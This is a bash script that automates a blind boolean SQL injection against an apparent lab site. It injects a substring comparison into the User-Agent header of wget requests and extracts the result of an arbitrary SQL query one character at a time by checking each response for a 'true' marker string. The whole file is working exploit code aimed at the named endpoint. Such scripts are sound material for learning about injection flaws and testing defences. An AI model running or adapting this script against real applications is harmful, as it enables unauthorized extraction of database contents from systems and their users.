#!/bin/bash

allowedChars=`echo {0..9}`
export URL="http://1.lab.sqli.site/getBrowserInfo.php"
export TrueState="It's nothing new"
export maxlength=$1
export query=$2
export result=""
export cur=""
export prev="0"

for (( j=1; j<=$maxlength; j=j+1))
do
	if [ "$prev" != "$cur" ]
	then
		export prev=$cur
		export nthchar=$j
		for i in $allowedChars:
		do
			wget --header="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' and substring(($query),$nthchar,1)='$i" "$URL" -qO- | grep "$TrueState" &>/dev/null
			if [ "$?" == "0" ]
			then
				echo "Character Found:$i"
				export result+=$i
				export cur=${#result}
				break
			fi
			export cur=${#result}
			echo "I=$i"
		done
	fi
done
echo Result: $result
